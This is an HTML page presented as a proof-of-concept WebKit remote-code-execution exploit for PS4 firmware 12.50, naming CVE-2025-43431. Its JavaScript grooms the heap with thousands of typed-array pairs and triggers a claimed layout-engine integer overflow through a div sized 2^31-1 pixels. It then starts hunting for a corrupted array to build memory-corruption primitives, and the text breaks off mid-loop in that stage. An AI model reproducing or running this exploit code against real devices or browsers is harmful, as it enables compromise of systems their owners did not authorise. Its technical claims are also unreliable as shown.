<!DOCTYPE html>
<html>
<head>
    <title>ps4 12.50 webkit rce (cve-2025-43431 PoC)</title>
    <style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;}</style>
</head>
<body>
<h1>ps4 12.50 webkit rce (cve-2025-43431 PoC)</h1>
<pre id="log"></pre>
<script>
const log = (msg) => document.getElementById('log').innerText += `[+] ${msg}\n`;

// --- stage 1: heap feng shui ---
// we're spraying objects that contain two adjacent arrays.
// the goal: the layout bug corrupts the metadata of the float_arr,
// allowing us to control its backing store pointer and length.
// we then point it at the obj_arr to get addrof/fakeobj.
log("stage 1: grooming heap with 0x4000 victim pairs...");
const victim_spray = [];
for (let i = 0; i < 0x4000; i++) {
    victim_spray[i] = [new Float64Array(1), [{}]]
}

// --- stage 2: the sledgehammer ---
// trigger the webcore layout bug. this causes an integer overflow
// during layout calculation, resulting in a small allocation with a huge
// size, leading to an out-of-bounds write.
log("stage 2: triggering layout engine corruption (cve-2025-43431)...");
const div = document.createElement('div');
div.style.cssText = `width: ${Math.pow(2, 31) - 1}px; height: ${Math.pow(2, 31) - 1}px; position: fixed;`;
document.body.appendChild(div);
// force reflow to trigger the bug. the browser now attempts to process this absurdity.
div.offsetWidth;
log("trigger sent. the heap is likely... messy.");

// --- stage 3: the hunt ---
// now we sift through the wreckage. we're looking for a Float64Array
// whose length has been changed from 1 to something ridiculously large.
log("stage 3: hunting for the corrupted array...");
let corrupted_float_arr = null;
let adjacent_obj_arr = null;

for (let i = 0; i < victim_spray.length; i++) 
